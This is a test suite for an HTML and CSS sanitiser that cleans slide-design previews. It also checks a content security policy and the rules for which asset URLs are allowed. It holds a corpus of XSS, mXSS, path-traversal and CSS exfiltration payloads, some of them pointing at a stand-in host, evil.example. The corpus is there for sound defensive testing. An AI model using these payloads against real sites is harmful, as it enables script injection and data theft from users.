import fc from "fast-check";
import { describe, expect, it } from "vitest";
import { parseDocument, walkElements } from "../src/html/dom.ts";
import {
  buildContentSecurityPolicy,
  buildPreviewDocument,
  isSanitized,
  isVirtualAssetUrl,
  PREVIEW_SANDBOX,
  rewriteVirtualUrls,
  STRICT_CSP,
  sanitizeDeclarationList,
  sanitizeFindings,
  sanitizeSlideHtml,
  sanitizeStylesheet,
} from "../src/sanitize/index.ts";
import { doc, SLIDE_NAMES, slide } from "./helpers.ts";

const wrap = (body: string, head = "") =>
  `<!doctype html><html lang="tr"><head><meta charset="utf-8"><link rel="stylesheet" href="/brand/brand.css">${head}</head><body><main data-artboard style="width:1080px;height:1350px">${body}</main></body></html>`;

/**
 * Every vector must come out with: no script-capable element, no on* attribute,
 * no javascript:/data:/external URL in any attribute or CSS, no base/meta refresh/form/frame.
 */
function assertSafe(html: string) {
  const d = parseDocument(html);
  const all = [...walkElements(d)];
  for (const el of all) {
    const tag = el.tagName.toLowerCase();
    expect([
      "script",
      "iframe",
      "frame",
      "frameset",
      "object",
      "embed",
      "base",
      "form",
      "input",
      "button",
      "textarea",
      "select",
      "template",
      "noscript",
      "math",
      "foreignobject",
      "animate",
      "set",
      "video",
      "audio",
      "canvas",
      "portal",
      "image",
      "feimage",
    ]).not.toContain(tag);
    if (tag === "meta") expect(el.attrs.some((a) => a.name === "http-equiv")).toBe(false);
    if (tag === "link")
      expect(el.attrs.find((a) => a.name === "href")?.value.startsWith("/brand/")).toBe(true);
    for (const a of el.attrs) {
      expect(a.name.toLowerCase().startsWith("on"), `${tag} ${a.name}`).toBe(false);
      expect(
        /javascript:|vbscript:|data:|https?:|\/\//i.test(a.value.replace(/\s/g, "")) &&
          a.name !== "content",
        `${tag} ${a.name}=${a.value}`,
      ).toBe(false);
    }
  }
  // second pass finds nothing (idempotent, verified by re-parsing)
  expect(sanitizeFindings(html)).toEqual([]);
}

const CORPUS: [string, string][] = [
  ["script", "<script>alert(1)</script>"],
  ["script src", '<script src="https://evil.example/x.js"></script>'],
  ["img onerror", '<img src=x onerror="alert(1)">'],
  ["svg onload", "<svg onload=alert(1)><circle r=1></circle></svg>"],
  ["svg script", "<svg><script>alert(1)</script></svg>"],
  [
    "svg foreignObject",
    "<svg><foreignObject><iframe src=javascript:alert(1)></iframe></foreignObject></svg>",
  ],
  [
    "svg animate href",
    '<svg><a><animate attributeName="href" values="javascript:alert(1)"/><text>x</text></a></svg>',
  ],
  ["svg set", '<svg><set attributeName="onmouseover" to="alert(1)"/></svg>'],
  ["svg use external", '<svg><use href="https://evil.example/s.svg#x"/></svg>'],
  ["svg image", '<svg><image href="https://evil.example/x.png"/></svg>'],
  [
    "svg fill url",
    '<svg><rect fill="url(https://evil.example/x.svg#p)" width="1" height="1"/></svg>',
  ],
  ["svg style breakout", "<svg><style><img src=x onerror=alert(1)></style></svg>"],
  [
    "svg style entity",
    "<svg><style>&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;</style></svg>",
  ],
  [
    "math mxss",
    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>",
  ],
  ["noscript mxss", '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>'],
  ["template", "<template><img src=x onerror=alert(1)></template>"],
  ["iframe srcdoc", '<iframe srcdoc="<script>alert(1)</script>"></iframe>'],
  ["object", '<object data="https://evil.example/x.swf"></object>'],
  ["embed", '<embed src="https://evil.example/x">'],
  ["form", '<form action="https://evil.example/"><input name=x><button>go</button></form>'],
  ["a javascript", '<a href="javascript:alert(1)">x</a>'],
  ["a entity javascript", '<a href="&#106;avascript:alert(1)">x</a>'],
  ["meta refresh", '<meta http-equiv="refresh" content="0;url=https://evil.example/">'],
  ["base", '<base href="https://evil.example/">'],
  ["link prefetch", '<link rel="prefetch" href="https://evil.example/leak">'],
  ["link stylesheet external", '<link rel="stylesheet" href="https://evil.example/x.css">'],
  ["link dns-prefetch", '<link rel="dns-prefetch" href="//evil.example">'],
  ["img external", '<img src="https://evil.example/pixel.png">'],
  ["img protocol-relative", '<img src="//evil.example/pixel.png">'],
  ["img data", '<img src="data:image/svg+xml,<svg onload=alert(1)>">'],
  ["img traversal", '<img src="/brand/../../etc/passwd">'],
  ["img encoded traversal", '<img src="/media/%2e%2e/%2e%2e/secret">'],
  ["img srcset", '<img src="/media/a.png" srcset="https://evil.example/a.png 2x">'],
  ["img lazy ping", '<img src="/media/a.png" loading="lazy" ping="https://evil.example">'],
  ["style attr url", '<div style="background:url(https://evil.example/x)">x</div>'],
  ["style attr escaped url", '<div style="background:u\\72l(https://evil.example/x)">x</div>'],
  ["style attr expression", '<div style="width:expression(alert(1))">x</div>'],
  ["style attr behavior", '<div style="behavior:url(x.htc)">x</div>'],
  [
    "style attr image-set",
    "<div style=\"background-image:image-set('https://evil.example/x.png' 1x)\">x</div>",
  ],
  [
    "style attr var url",
    "<div style=\"--u:'https://evil.example/x';background-image:image-set(var(--u) 1x)\">x</div>",
  ],
  [
    "style attr nested rule",
    '<div style="color:red; a { background: url(https://evil.example/) }">x</div>',
  ],
  ["button formaction", '<button formaction="javascript:alert(1)">x</button>'],
  ["marquee", "<marquee onstart=alert(1)>x</marquee>"],
  ["details ontoggle", "<details open ontoggle=alert(1)><summary>x</summary></details>"],
  ["body onload", '<body onload="alert(1)">'],
  ["dialog", "<dialog open><p>x</p></dialog>"],
  ["custom element", "<x-evil onclick=alert(1)>text</x-evil>"],
  ["unknown attr", '<div data-layer="a" data-type="shape" xmlns:xlink="x" formaction="x"></div>'],
];

const STYLE_CORPUS: [string, string][] = [
  ["@import", '@import url("https://evil.example/x.css"); p { color: red }'],
  ["@import string", "@import 'https://evil.example/x.css';"],
  ["@namespace", "@namespace url(https://evil.example/);"],
  ["background url", "div { background: url(https://evil.example/x.png) }"],
  ["escaped url", "div { background: \\75 rl(https://evil.example/x.png) }"],
  ["font-face external", "@font-face { font-family: x; src: url(https://evil.example/f.woff2) }"],
  ["attribute exfiltration", 'input[value^="a"] { background: url(https://evil.example/?a) }'],
  ["cursor", "body { cursor: url(https://evil.example/c.cur), auto }"],
  ["content url", "p::before { content: url(https://evil.example/x.png) }"],
  ["mask", "div { mask-image: url(//evil.example/m.svg) }"],
  ["src()", 'div { background-image: src("https://evil.example/x.png") }'],
  [
    "image-set strings",
    'div { background-image: -webkit-image-set("https://evil.example/x.png" 1x) }',
  ],
  ["expression", "div { width: expression(alert(1)) }"],
  ["-moz-binding", "div { -moz-binding: url(https://evil.example/x.xml#b) }"],
  ["typed attr", "div { background-image: attr(data-src type(<url>)) }"],
  ["bad url", "div { background: url(https://evil.example/ x) }"],
  ["media nested", "@media screen { div { background: url(https://evil.example/x) } }"],
  [
    "supports nested",
    "@supports (display:grid) { div { background: url(https://evil.example/x) } }",
  ],
  ["nesting", "div { color: red; & span { background: url(https://evil.example/x) } }"],
  ["unknown at-rule", "@evil { div { color: red } }"],
];

describe("sanitiser: XSS and exfiltration corpus", () => {
  it.each(CORPUS)("%s", (_name, vector) => {
    const res = sanitizeSlideHtml(wrap(vector));
    assertSafe(res.html);
    expect(res.findings.length).toBeGreaterThan(0);
  });

  it.each(STYLE_CORPUS)("<style> %s", (_name, css) => {
    const res = sanitizeSlideHtml(
      wrap('<p data-layer="t" data-type="text">x</p>', `<style>${css}</style>`),
    );
    assertSafe(res.html);
    expect(res.findings.length).toBeGreaterThan(0);
    expect(res.html).not.toMatch(/evil\.example|expression\(|binding|@import|@namespace|@evil/);
  });

  it("keeps safe content around removed parts", () => {
    const res = sanitizeSlideHtml(
      wrap(
        '<p data-layer="t" data-type="text" onclick="x()">Merhaba <b>dünya</b></p><script>alert(1)</script>',
      ),
    );
    expect(res.html).toContain('<p data-layer="t" data-type="text">Merhaba <b>dünya</b></p>');
    expect(res.mode).toBe("splice");
    const custom = sanitizeSlideHtml(wrap("<x-evil>kept text</x-evil>"));
    expect(custom.html).toContain(">kept text</main>");
  });

  it("allows virtual-origin assets and fragment references", () => {
    const ok = wrap(
      '<img data-layer="a" data-type="image" src="/media/a%20b.jpg" alt=""><svg data-layer="s" data-type="shape" viewBox="0 0 2 2"><defs><linearGradient id="g"><stop offset="0" stop-color="#000"/></linearGradient></defs><rect fill="url(#g)" width="2" height="2"/><use href="#g"/></svg>',
      "<style>div { background: url(/brand/assets/x.png) } @font-face { font-family: X; src: url(/brand/fonts/x.woff2) }</style>",
    );
    expect(isSanitized(ok)).toBe(true);
  });

  it("falls back to rebuilding when splicing cannot reach a node (merged body attributes)", () => {
    const res = sanitizeSlideHtml(`${wrap("<p>x</p>")}<body onload="alert(1)">`);
    assertSafe(res.html);
    expect(res.mode).toBe("rebuild");
  });
});

describe("sanitiser on clean designs", () => {
  it.each(SLIDE_NAMES.filter((n) => n !== "spike-bad"))("%s comes back byte-identical", (name) => {
    const html = slide(name);
    const res = sanitizeSlideHtml(html);
    expect(res.findings).toEqual([]);
    expect(res.changed).toBe(false);
    expect(res.mode).toBe("unchanged");
    expect(res.html).toBe(html);
  });

  it("the spike's broken fixture is cleaned and stays cleaned", () => {
    const res = sanitizeSlideHtml(slide("spike-bad"));
    assertSafe(res.html);
    expect(res.findings.map((f) => f.tag)).toEqual(
      expect.arrayContaining(["script", "button", "link", "img"]),
    );
    expect(sanitizeSlideHtml(res.html).html).toBe(res.html);
  });
});

describe("sanitiser properties", () => {
  const piece = fc.constantFrom(
    "<script>alert(1)</script>",
    '<img src="https://e.example/x" onerror=alert(1)>',
    '<img data-layer="i" data-type="image" src="/media/ok.jpg" alt="">',
    '<p data-layer="t" data-type="text">ok</p>',
    "<svg><foreignObject><b>x</b></foreignObject></svg>",
    '<div style="background:url(https://e.example/)">x</div>',
    "<style>@import 'x'; p{color:red}</style>",
    "<!--",
    "-->",
    "<math><style>",
    "</p>",
    "<table><td>",
    '<a href="javascript:x">',
    "<noscript>",
    "<template>",
    "</style>",
    "<xmp>",
    '"',
    "'",
    ">",
    "<",
  );
  it("output is always safe and sanitising twice changes nothing", () => {
    fc.assert(
      fc.property(
        fc.array(piece, { maxLength: 10 }),
        fc.array(piece, { maxLength: 4 }),
        (body, head) => {
          const res = sanitizeSlideHtml(wrap(body.join(""), head.join("")));
          assertSafe(res.html);
          expect(sanitizeSlideHtml(res.html).html).toBe(res.html);
        },
      ),
      { numRuns: 400 },
    );
  });
});

describe("CSS sanitiser", () => {
  it("removes only the unsafe declaration and keeps the rest byte-identical", () => {
    const css = "a { color: red; background: url(https://e.example/x); width: 10px }";
    expect(sanitizeStylesheet(css).css).toBe("a { color: red; width: 10px }");
    expect(sanitizeDeclarationList("color: red; background:url(//e.example/x); top: 0").css).toBe(
      "color: red; top: 0",
    );
    expect(sanitizeStylesheet("p { color: red }").findings).toEqual([]);
  });
});

describe("asset URL policy", () => {
  it.each([
    ["/brand/brand.css", true],
    ["/brand/fonts/archivo-latin-wdth-normal.woff2", true],
    ["/media/2026/a%20b.jpg", true],
    ["/brand/", true],
    ["/other/x.png", false],
    ["brand/x.png", false],
    ["//evil.example/brand/x", false],
    ["/brand/../x", false],
    ["/brand/%2e%2e/x", false],
    ["/brand/x.png?leak=1", false],
    ["/brand/x.png#frag", false],
    ["/brand/x\\y", false],
    ["/brand/x y.png", false],
    ["https://studio.invalid/brand/x.png", false],
    ["data:image/png;base64,AA", false],
    ["javascript:alert(1)", false],
  ] as const)("%s -> %s", (url, ok) => {
    expect(isVirtualAssetUrl(url)).toBe(ok);
  });
});

describe("preview document", () => {
  it("embeds the CSP first in <head>, sanitises, and keeps the design otherwise intact", () => {
    const html = slide("product-intro");
    const p = buildPreviewDocument(
      `${html.replace("</main>", "<script>alert(1)</script></main>")}`,
    );
    expect(p.srcdoc.indexOf('<meta http-equiv="Content-Security-Policy"')).toBeLessThan(
      p.srcdoc.indexOf("<meta charset"),
    );
    expect(p.srcdoc).not.toContain("<script>");
    expect(p.csp).toBe(STRICT_CSP);
    expect(p.iframe).toEqual({
      sandbox: PREVIEW_SANDBOX,
      referrerpolicy: "no-referrer",
      csp: STRICT_CSP,
    });
    expect(PREVIEW_SANDBOX).not.toContain("allow-scripts");
    expect(p.findings.map((f) => f.tag)).toEqual(["script"]);
  });

  it("maps virtual URLs to the editor's asset host and allows only that origin", () => {
    const html = doc(
      '<img data-layer="a" data-type="image" src="/media/a.jpg" alt=""><p data-layer="t" data-type="text" style="background-color: red">x</p>',
      "div { background: url(/brand/assets/x.png) }",
    );
    const p = buildPreviewDocument(html, {
      assets: {
        brand: "https://studio.example/api/brands/b1/files/",
        media: "https://media.example/m/",
      },
    });
    expect(p.srcdoc).toContain('href="https://studio.example/api/brands/b1/files/brand.css"');
    expect(p.srcdoc).toContain('src="https://media.example/m/a.jpg"');
    expect(p.srcdoc).toContain('url("https://studio.example/api/brands/b1/files/assets/x.png")');
    expect(p.csp).toContain("img-src https://studio.example https://media.example");
    expect(
      rewriteVirtualUrls(html, { brand: "https://a.example/", media: "https://b.example/" }),
    ).not.toBe(html);
  });

  it("the policy forbids scripts, frames, forms, connections and foreign assets", () => {
    for (const d of [
      "script-src 'none'",
      "object-src 'none'",
      "base-uri 'none'",
      "form-action 'none'",
      "frame-src 'none'",
      "connect-src 'none'",
      "default-src 'none'",
      "img-src 'self'",
      "font-src 'self'",
    ])
      expect(STRICT_CSP).toContain(d);
    expect(() =>
      buildContentSecurityPolicy({ assetSources: ["https://ok.example", "*"] }),
    ).toThrow();
    expect(() =>
      buildContentSecurityPolicy({ assetSources: ["https://x.example; script-src *"] }),
    ).toThrow();
  });
});
